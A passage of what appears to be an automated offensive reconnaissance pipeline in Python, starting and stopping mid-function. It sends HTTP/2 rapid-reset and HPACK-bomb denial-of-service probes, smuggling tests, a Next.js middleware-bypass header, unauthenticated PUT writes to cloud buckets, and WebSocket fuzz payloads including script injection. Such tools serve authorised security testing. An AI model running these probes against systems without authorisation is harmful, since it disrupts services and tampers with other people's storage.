                    while True:
                        chunk = sock.recv(65535)
                        if not chunk:
                            break
                        recv_total += len(chunk)
                        if recv_total > MAX_RECV:
                            break
                        conn.receive_data(chunk)
                except _socket.timeout:
                    pass
                sock.close()
                if rapid_duration > baseline_latency * 3:
                    findings.append(f"[h2-rapid-reset] {host} — RST_STREAM storm: {rapid_duration:.2f}s vs baseline {baseline_latency:.2f}s (>3x, possible CVE-2023-44487)")
                else:
                    findings.append(f"[h2-rapid-reset-safe] {host} — rapid reset latency normal ({rapid_duration:.2f}s)")
            else:
                sock.close()
                findings.append(f"[h2-rapid-reset-skip] {host} — no response on baseline request")
        except Exception as e:
            findings.append(f"[h2-rapid-reset-error] {host} — {e}")

        # 2. HPACK bomb
        try:
            ctx = _ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = _socket.create_connection((host_clean, port), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            negotiated = sock.selected_alpn_protocol()
            if negotiated != "h2":
                sock.close()
                raise ConnectionError("server does not support h2")
            config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            stream_id = conn.get_next_available_stream_id()
            bomb_value = "A" * 100000
            conn.send_headers(stream_id, [
                (":method", "GET"),
                (":path", "/?hpack_bomb=1"),
                (":authority", host_clean),
                (":scheme", "https"),
                ("x-hpack-test", bomb_value),
            ])
            sock.sendall(conn.data_to_send())
            hpack_resp = b""
            recv_total = 0
            try:
                sock.settimeout(10)
                while True:
                    chunk = sock.recv(65535)
                    if not chunk:
                        break
                    recv_total += len(chunk)
                    if recv_total > MAX_RECV:
                        break
                    events = conn.receive_data(chunk)
                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            hpack_resp += b"<response>"
            except _socket.timeout:
                pass
            sock.close()
            if hpack_resp:
                findings.append(f"[h2-hpack-bomb] {host} — HPACK bomb accepted ({len(hpack_resp)}b, server may be vulnerable)")
            else:
                findings.append(f"[h2-hpack-bomb-safe] {host} — HPACK large header rejected/connection closed")
        except Exception as e:
            findings.append(f"[h2-hpack-bomb-error] {host} — {e}")

        # 3. H2 → H1 downgrade smuggling
        try:
            ctx = _ssl.create_default_context()
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = _socket.create_connection((host_clean, port), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            negotiated = sock.selected_alpn_protocol()
            if negotiated == "h2":
                raw_h1 = (
                    f"GET /smuggle-test HTTP/1.1\r\n"
                    f"Host: {host_safe}\r\n"
                    f"Content-Length: 0\r\n"
                    f"\r\n"
                )
                sock.sendall(raw_h1.encode())
                downgrade_resp = b""
                try:
                    sock.settimeout(10)
                    recv_total = 0
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        recv_total += len(chunk)
                        if recv_total > MAX_RECV:
                            break
                        downgrade_resp += chunk
                except _socket.timeout:
                    pass
                sock.close()
                downgrade_text = downgrade_resp.decode("utf-8", errors="ignore")
                if "smuggle-test" in downgrade_text.lower() or "HTTP/1.1" in downgrade_text:
                    findings.append(f"[h2-h1-downgrade] {host} — HTTP/1.1 request smuggled inside H2 connection")
                else:
                    findings.append(f"[h2-h1-downgrade-safe] {host} — H2 connection refused raw HTTP/1.1")
            else:
                sock.close()
                findings.append(f"[h2-h1-downgrade-skip] {host} — server did not negotiate h2 (got {negotiated})")
        except Exception as e:
            findings.append(f"[h2-h1-downgrade-error] {host} — {e}")

        # 4. H2 connection preface smuggling
        try:
            ctx = _ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = _socket.create_connection((host_clean, port), timeout=10)
            sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            malformed_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + b"\x00\x00\x00\x00\x00\x00\x00\x00"
            sock.sendall(malformed_preface)
            preface_resp = b""
            recv_total = 0
            try:
                sock.settimeout(10)
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    recv_total += len(chunk)
                    if recv_total > MAX_RECV:
                        break
                    preface_resp += chunk
            except _socket.timeout:
                pass
            sock.close()
            if preface_resp:
                preface_text = preface_resp.decode("utf-8", errors="ignore")
                if "goaway" in preface_text.lower() or "error" in preface_text.lower():
                    findings.append(f"[h2-preface-smuggle] {host} — server responded to malformed preface: {preface_text[:120]}")
                else:
                    findings.append(f"[h2-preface-tested] {host} — server replied with {len(preface_resp)}b to bad preface")
            else:
                findings.append(f"[h2-preface-tested] {host} — server closed on malformed preface (expected)")
        except Exception as e:
            findings.append(f"[h2-preface-error] {host} — {e}")

        # 5. QUIC/H3 probe over UDP
        try:
            udp_sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            udp_sock.settimeout(5)
            quic_version = struct.pack("!I", 1)
            quic_payload = b"\xc0" + quic_version + b"\x00" * 20
            udp_sock.sendto(quic_payload, (host_clean, 443))
            try:
                quic_resp, _ = udp_sock.recvfrom(2048)
                if quic_resp and len(quic_resp) >= 5 and quic_resp[0] & 0x80 and quic_resp[1:5] == b"\x00\x00\x00\x00":
                    findings.append(f"[h3-quic] {host} — QUIC version negotiation detected (H3 supported)")
                else:
                    findings.append(f"[h3-quic-probe] {host} — QUIC responded ({len(quic_resp)}b)")
            except _socket.timeout:
                findings.append(f"[h3-quic-timeout] {host} — no QUIC response")
            udp_sock.close()
        except Exception as e:
            findings.append(f"[h3-quic-error] {host} — {e}")

    if not findings:
        findings.append("[h2-h3] No HTTP/2 or HTTP/3 candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"38b-H2SMUGGLE: {len(findings)} probes -> {out}")
    return {"38b-H2SMUGGLE": str(out), "count": len(findings)}


async def phase_49_FRAMEWORKS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"49-FRAMEWORKS"}:
        return {}
    _out = outdir / "framework_vulns.txt"
    if _out.exists() and not force:
        return {"49-FRAMEWORKS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 49-FRAMEWORKS: web framework detection and vulnerability checks")
    findings: List[str] = []
    _fw_urlopen = _get_urlopener()
    _fw_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists() or not read_lines(hosts_file):
        log("warn", "49-FRAMEWORKS: no host targets; skipping")
        return {"49-FRAMEWORKS": str(_out), "count": 0}
    hosts = read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_frameworks]
    FRAMEWORK_SIGS: Dict[str, List[Dict[str, str]]] = {
        "Next.js": [{"type": "html", "marker": "__NEXT_DATA__"}, {"type": "header", "name": "x-powered-by", "value": "next"}],
        "React": [{"type": "html", "marker": "data-reactroot"}, {"type": "html", "marker": "data-reactid"}],
        "Vue": [{"type": "html", "marker": "data-v-"}, {"type": "html", "marker": "__vue__"}],
        "Angular": [{"type": "html", "marker": "ng-version"}, {"type": "html", "marker": "ng-app"}],
        "Svelte": [{"type": "html", "marker": "__svelte__"}, {"type": "html", "marker": "svelte-"}],
        "Astro": [{"type": "html", "marker": "astro-"}, {"type": "header", "name": "x-astro", "value": ""}],
        "Nuxt": [{"type": "html", "marker": "__NUXT__"}],
        "Vite": [{"type": "header", "name": "server", "value": "vite"}],
    }
    detected: Dict[str, Set[str]] = {}
    for host in hosts:
        await _throttle_rate()
        base = host if host.startswith("http") else f"https://{host}"
        base = base.rstrip("/")
        try:
            req = urllib.request.Request(base, headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
            _, resp_h, body_bytes = await _async_urlopen(_fw_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
            for fw_name, sigs in FRAMEWORK_SIGS.items():
                for sig in sigs:
                    if sig["type"] == "html" and sig["marker"] in body:
                        detected.setdefault(host, set()).add(fw_name)
                        break
                    elif sig["type"] == "header":
                        hdr_val = resp_h.get(sig["name"], "").lower()
                        if (sig["value"] and sig["value"] in hdr_val) or (not sig["value"] and hdr_val):
                            detected.setdefault(host, set()).add(fw_name)
                            break
        except Exception:
            continue
    if not detected:
        findings.append("[frameworks] No web frameworks detected")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        log("ok", f"49-FRAMEWORKS: {len(findings)} findings → {out}")
        return {"49-FRAMEWORKS": str(_out), "count": len(findings)}
    for host, frameworks in detected.items():
        base = host if host.startswith("http") else f"https://{host}"
        base = base.rstrip("/")
        for fw in sorted(frameworks):
            findings.append(f"[framework-detected] {host} — {fw}")
            if fw == "Next.js":
                for path in ["/_next/data/", "/_next/static/"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[nextjs-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
                try:
                    req = urllib.request.Request(base + "/", method="GET", headers={"User-Agent": "Mozilla/5.0", "x-middleware-subrequest": "true", **_fw_extra_headers})
                    s, rh, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                    if "x-middleware-rewrite" in str(rh).lower():
                        findings.append(f"[nextjs-middleware] {base} — x-middleware-subrequest bypass possible")
                except Exception:
                    continue
                for route in ["/_next/data/develop.json", "/_next/data/production.json"]:
                    try:
                        req = urllib.request.Request(base + route, method="GET", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200 and len(b) > 50:
                            findings.append(f"[nextjs-data-exposure] {base}{route} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "React":
                for path in ["/static/js/bundle.js.map", "/static/js/main.js.map"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[react-sourcemap] {base}{path} — sourcemap exposed")
                    except Exception:
                        continue
                try:
                    req = urllib.request.Request(base + "/sockjs-node/", method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                    s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                    if s < 400:
                        findings.append(f"[react-sockjs] {base}/sockjs-node/ — dev server exposed in prod")
                except Exception:
                    continue
            elif fw == "Vue":
                for path in ["/vue-multiselect/", "/vue-router/"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[vue-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "Angular":
                for path in ["/runtime.js", "/polyfills.js", "/runtime-es2015.js", "/polyfills-es2015.js"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[angular-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
                for path in ["/runtime.js.map", "/polyfills.js.map"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[angular-sourcemap] {base}{path} — sourcemap exposed")
                    except Exception:
                        continue
            elif fw == "Svelte":
                for path in ["/__action/", "/__action/__form/"]:
                    try:
                        req = urllib.request.Request(base + path, data=b"", method="POST", headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s in (200, 302, 405):
                            findings.append(f"[sveltekit-action] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "Astro":
                for path in ["/_astro/", "/astro.env"]:
                    try:
                        req = urllib.request.Request(base + path, method="GET", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200 and len(b) > 20:
                            findings.append(f"[astro-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "Nuxt":
                for path in ["/_nuxt/", "/_nuxt/builds/meta/dev.json"]:
                    try:
                        req = urllib.request.Request(base + path, method="GET", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[nuxt-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "Vite":
                for path in ["/@vite/client", "/__vite_ping"]:
                    try:
                        req = urllib.request.Request(base + path, method="GET", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[vite-dev-server] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
    if not findings:
        findings.append("[frameworks] No framework-specific vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"49-FRAMEWORKS: {len(findings)} framework findings → {out}")
    return {"49-FRAMEWORKS": str(_out), "count": len(findings)}


# ────────────────── Phase 50-BUCKET-PERMS: Bucket Permission Auditing ──────────
async def phase_50_BUCKET_PERMS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"50-BUCKET-PERMS"}:
        return {}
    _out = outdir / "bucket_permissions.txt"
    if _out.exists() and not force:
        return {"50-BUCKET-PERMS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 50-BUCKET-PERMS: cloud bucket permission auditing")
    findings: List[str] = []
    _b_urlopen = _get_urlopener()
    _b_extra_headers = _extra_headers_dict()
    buckets_file = outdir / "cloud_buckets.txt"
    bucket_entries = read_lines(buckets_file) if buckets_file.exists() else []
    if not bucket_entries:
        findings.append("[bucket-perms] No cloud buckets to audit")
        out = ensure(_out)
        out.write_text("\n".join(findings) + "\n")
        return {"50-BUCKET-PERMS": str(out), "count": 0}

    async def _probe_bucket(url: str, label: str) -> List[str]:
        res: List[str] = []
        try:
            req = urllib.request.Request(url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_b_extra_headers})
            s, _, body_bytes = await _async_urlopen(_b_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if s == 200 and ("<Key" in body or "<Contents" in body or "ETag" in body or "Name>" in body):
                res.append(f"[bucket-public-read] {label} — {url} — HTTP {s} (public listing accessible)")
            elif s == 200:
                res.append(f"[bucket-public-access] {label} — {url} — HTTP {s}")
            elif s in (301, 302, 307):
                res.append(f"[bucket-redirect] {label} — {url} — HTTP {s}")
        except urllib.error.HTTPError as e:
            if e.code in (403, 400):
                pass
            elif e.code == 404:
                pass
            else:
                res.append(f"[bucket-http-error] {label} — {url} — HTTP {e.code}")
        except Exception:
            pass
        try:
            put_req = urllib.request.Request(url + "/.reconchain_permtest",
                data=b"reconchain-permtest", method="PUT",
                headers={"User-Agent": "Mozilla/5.0", **_b_extra_headers})
            ps, _, _ = await _async_urlopen(_b_urlopen, put_req, timeout=10)
            if ps in (200, 201, 204):
                res.append(f"[bucket-public-write] {label} — {url} — PUT HTTP {ps} (unauthenticated write)")
        except urllib.error.HTTPError as e:
            if e.code == 405:
                res.append(f"[bucket-write-allowed] {label} — {url} — PUT not allowed (expected)")
        except Exception:
            pass
        return res

    for entry in bucket_entries:
        entry_lower = entry.lower()
        if "s3" in entry_lower or "amazonaws" in entry_lower or "aws" in entry_lower:
            for region in ["us-east-1", "eu-west-1", "us-west-2", ""]:
                base = entry.split(".s3")[0] if ".s3" in entry else entry.split("://")[-1].split("/")[0]
                url = f"https://{base}.s3.{region}.amazonaws.com/" if region else f"https://{base}.s3.amazonaws.com/"
                r = await _probe_bucket(url, entry[:60])
                findings.extend(r)
        elif "blob.core" in entry_lower or "azure" in entry_lower:
            url = entry.rstrip("/") + "?restype=container&comp=list" if "?" not in entry else entry
            r = await _probe_bucket(url, entry[:60])
            findings.extend(r)
        elif "storage.googleapis" in entry_lower or "gcp" in entry_lower or "googleapis" in entry_lower:
            r = await _probe_bucket(entry.rstrip("/") + "/", entry[:60])
            findings.extend(r)
        else:
            for prefix in ["https://", "http://"]:
                if entry.startswith(prefix):
                    r = await _probe_bucket(entry.rstrip("/") + "/", entry[:60])
                    findings.extend(r)

    if not findings:
        findings.append("[bucket-perms] No public bucket permissions detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"50-BUCKET-PERMS: {len(findings)} bucket permission findings → {out}")
    return {"50-BUCKET-PERMS": str(out), "count": len(findings)}


# ────────────────── Phase 51-HPP: HTTP Parameter Pollution ─────────────────────
async def phase_51_HPP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"51-HPP"}:
        return {}
    _out = outdir / "hpp.txt"
    if _out.exists() and not force:
        return {"51-HPP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 51-HPP: HTTP parameter pollution detection")
    findings: List[str] = []
    _h_urlopen = _get_urlopener()
    _h_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "51-HPP: no URLs; skipping")
        return {"51-HPP": str(_out), "count": 0}
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:50]
    hpp_pollutions = ["first", "last", "any", "concat"]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in list(qs.keys())[:3]:
            orig_val = qs[param_name][0]
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for strategy in hpp_pollutions:
                try:
                    if strategy == "first":
                        test_qs = urllib.parse.urlencode({param_name: [orig_val, "hpp_test_first"]}, doseq=True)
                    elif strategy == "last":
                        test_qs = urllib.parse.urlencode({param_name: ["hpp_test_last", orig_val]}, doseq=True)
                    elif strategy == "any":
                        test_qs = urllib.parse.urlencode({param_name: [orig_val, "hpp_test_any"]}, doseq=True)
                    else:
                        test_qs = urllib.parse.urlencode(
                            {f"{param_name}[]": orig_val, param_name: "hpp_test_concat"}, doseq=True)
                    ref_qs = urllib.parse.urlencode(qs, doseq=True)
                    ref_url = urllib.parse.urlunparse(parsed._replace(query=ref_qs))
                    test_url = urllib.parse.urlunparse(parsed._replace(query=test_qs))
                    await _throttle_rate()
                    req = urllib.request.Request(ref_url, headers={"User-Agent": "Mozilla/5.0", **_h_extra_headers})
                    _, _, ref_body_bytes = await _async_urlopen(_h_urlopen, req, timeout=10)
                    treq = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_h_extra_headers})
                    _, _, test_body_bytes = await _async_urlopen(_h_urlopen, treq, timeout=10)
                    ref_body = ref_body_bytes.decode("utf-8", errors="ignore")
                    test_body = test_body_bytes.decode("utf-8", errors="ignore")
                    if len(test_body) != len(ref_body) or "hpp_test" in test_body:
                        findings.append(
                            f"[hpp-reflected] {test_url} param={param_name} strategy={strategy} "
                            f"(response differs from baseline)"
                        )
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[hpp] No HTTP parameter pollution candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"51-HPP: {len(findings)} HPP findings → {out}")
    return {"51-HPP": str(out), "count": len(findings)}


# ────────────────── Phase 52-SERVERLESS: Serverless Endpoint Discovery ─────────
_SERVERLESS_PATHS = [
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3",
    "/prod", "/dev", "/staging",
    "/lambda", "/functions", "/function",
    "/.netlify/functions", "/.netlify/",
    "/_ah/api",  # GAE
    "/api/users", "/api/health", "/api/status", "/api/config",
    "/api/swagger.json", "/api/openapi.json",
    "/api/graphql", "/graphql",
    "/admin/api", "/admin",
    "/.env", "/.env.local",
]

async def phase_52_SERVERLESS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"52-SERVERLESS"}:
        return {}
    _out = outdir / "serverless_endpoints.txt"
    if _out.exists() and not force:
        return {"52-SERVERLESS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 52-SERVERLESS: serverless / cloud function endpoint discovery")
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _s_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "52-SERVERLESS: no hosts; skipping")
        return {"52-SERVERLESS": str(_out), "count": 0}
    for host in hosts[:20]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            for path in _SERVERLESS_PATHS:
                url = f"{scheme}{host_clean}{path}"
                try:
                    req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_s_extra_headers})
                    s, _, b = await _async_urlopen(_s_urlopen, req, timeout=8)
                    if s in (200, 201, 202, 204, 401, 403):
                        body_sample = b.decode("utf-8", errors="ignore")[:200]
                        kw_found = [kw for kw in ["api", "user", "admin", "graphql", "swagger", "lambda", "function", "cloud", "runtime", "serverless"] if kw in body_sample.lower()]
                        extra = f" keywords={kw_found}" if kw_found else ""
                        findings.append(f"[serverless-endpoint] {url} — HTTP {s}{extra}")
                except (urllib.error.HTTPError, urllib.error.URLError, OSError):
                    pass
                except Exception:
                    pass
    if not findings:
        findings.append("[serverless] No serverless endpoints discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"52-SERVERLESS: {len(findings)} serverless endpoints → {out}")
    return {"52-SERVERLESS": str(out), "count": len(findings)}


# ────────────────── Phase 53-CSP: CSP Bypass Analysis ──────────────────────────
_CSP_BYPASS_CDNS = {
    "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "unpkg.com", "ajax.googleapis.com",
    "ajax.aspnetcdn.com", "stackpath.bootstrapcdn.com", "maxcdn.bootstrapcdn.com",
    "code.jquery.com", "cdn.shopify.com", "cdn.rawgit.com", "rawgit.com",
    "gitcdn.xyz", "cdn.statically.io", "www.google.com", "accounts.google.com",
    "apis.google.com", "youtube.com", "www.youtube.com", "platform.twitter.com",
    "www.facebook.com", "staticxx.facebook.com",
}

async def phase_53_CSP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"53-CSP"}:
        return {}
    _out = outdir / "csp_analysis.txt"
    if _out.exists() and not force:
        return {"53-CSP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 53-CSP: Content-Security-Policy analysis")
    findings: List[str] = []
    _c_urlopen = _get_urlopener()
    _c_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "53-CSP: no hosts; skipping")
        return {"53-CSP": str(_out), "count": 0}
    for host in hosts[:20]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            url = f"{scheme}{host_clean}/"
            try:
                req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_c_extra_headers})
                s, headers, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
                csp = headers.get("Content-Security-Policy") or headers.get("Content-Security-Policy-Report-Only") or ""
                if csp:
                    csp_lower = csp.lower()
                    issues = []
                    if "'unsafe-inline'" in csp_lower:
                        issues.append("unsafe-inline present")
                    if "'unsafe-eval'" in csp_lower:
                        issues.append("unsafe-eval present")
                    if "*.google.com" in csp_lower or "*.facebook.com" in csp_lower or "*.cdn" in csp_lower:
                        issues.append("wildcard in CSP source")
                    for cdn in _CSP_BYPASS_CDNS:
                        if cdn in csp_lower:
                            issues.append(f"script-source allows known-bypass CDN: {cdn}")
                    if "https:" in csp_lower and "http:" not in csp_lower:
                        pass
                    elif "http:" in csp_lower:
                        issues.append("CSP allows http: scheme (MITM risk)")
                    if not csp_lower.startswith("default-src") and "default-src " not in csp_lower:
                        issues.append("no default-src defined (fallback to open)")
                    if issues:
                        findings.append(f"[csp-issues] {url} — {'; '.join(issues)}")
                    findings.append(f"[csp-header] {url} — {csp[:200]}")
                else:
                    findings.append(f"[csp-missing] {url} — no Content-Security-Policy header")
                break
            except (urllib.error.HTTPError, urllib.error.URLError, OSError):
                continue
            except Exception:
                continue
        else:
            continue
    if not findings:
        findings.append("[csp] No CSP issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"53-CSP: {len(findings)} CSP findings → {out}")
    return {"53-CSP": str(out), "count": len(findings)}


# ────────────────── Phase 54-WS-FUZZ: WebSocket Message Fuzzing ────────────────
_WS_FUZZ_PAYLOADS = [
    b'{"type":"ping"}',
    b'{"type":"subscribe","channel":"admin"}',
    b'{"type":"auth","token":"none"}',
    b'{"operationName":"IntrospectionQuery","query":"{__schema{types{name}}}","variables":{}}',
    b'{"query":"mutation{__debug{setCookie(name:\"x\",value:\"x\")}__sleep(ms:30000)}"}',
    b'<script>alert(1)</script>',
    b'{"id":"1","jsonrpc":"2.0","method":"listDatabases","params":{}}',
    b'\x00\x01\x02\x03',
    b'A' * 10000,
    b'{"type":"publish","channel":"*","data":"test"}',
]

async def phase_54_WS_FUZZ(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"54-WS-FUZZ"}:
        return {}
    _out = outdir / "websocket_fuzz.txt"
    if _out.exists() and not force:
        return {"54-WS-FUZZ": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 54-WS-FUZZ: WebSocket message fuzzing")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "54-WS-FUZZ: raw sockets incompatible with proxy; skipping")
        return {"54-WS-FUZZ": str(_out), "count": 0}
    findings: List[str] = []
    _ws_extra_headers = _extra_headers_dict()
    ws_file = outdir / "websocket.txt"
    ws_findings = read_lines(ws_file) if ws_file.exists() else []
    ws_endpoints: List[str] = []
    for line in ws_findings:
        for proto in ("wss://", "ws://"):
            if proto in line:
                parts = line.split()
                for p in parts:
                    if p.startswith(proto):
                        ws_endpoints.append(p)
                        break
                break
    ws_endpoints = ws_endpoints[:5]
    if not ws_endpoints:
        ws_file2 = outdir / "endpoints_wss.txt"
        if ws_file2.exists():
            ws_endpoints = read_lines(ws_file2)[:5]
    if not ws_endpoints:
        findings.append("[ws-fuzz] No WebSocket endpoints to fuzz")
        out = ensure(_out)
        out.write_text("\n".join(findings) + "\n")
        return {"54-WS-FUZZ": str(out), "count": 0}

    import socket as _ws_socket
    import ssl as _ws_ssl
    import base64 as _ws_b64
    import struct as _ws_struct

    def _ws_connect(endpoint: str) -> Tuple[Optional[_ws_socket.socket], Optional[str]]:
        try:
            parsed = urllib.parse.urlparse(endpoint)
            scheme = parsed.scheme
            host = parsed.hostname or ""
            port = parsed.port or (443 if scheme == "wss" else 80)
            path = parsed.path or "/"
            sock = _ws_socket.socket(_ws_socket.AF_INET, _ws_socket.SOCK_STREAM)
            sock.settimeout(5)
            if scheme == "wss":
                ctx = _ws_ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            ws_key = _ws_b64.b64encode(os.urandom(16)).decode()
            upgrade = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"\r\n"
            )
            sock.sendall(upgrade.encode())
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > MAX_RECV or b"\r\n\r\n" in resp:
                        break
            except _ws_socket.timeout:
                pass
            if b"101" in resp and b"websocket" in resp.lower():
                return sock, endpoint
            sock.close()
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
        return None, None

    def _ws_encode(data: bytes, opcode: int = 0x1) -> bytes:
        frame = bytearray()
        frame.append(0x80 | opcode)
        mask = os.urandom(4)
        length = len(data)
        if length < 126:
            frame.append(0x80 | length)
        elif length < 65536:
            frame.append(0x80 | 126)
            frame += _ws_struct.pack("!H", length)
        else:
            frame.append(0x80 | 127)
            frame += _ws_struct.pack("!Q", length)
        frame += mask
        frame += bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        return bytes(frame)

    def _ws_send(sock: _ws_socket.socket, data: bytes, timeout: float = 4.0) -> Optional[bytes]:
        sock.settimeout(timeout)
        try:
            sock.sendall(_ws_encode(data))
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > MAX_RECV:
                    break
            return resp
        except _ws_socket.timeout:
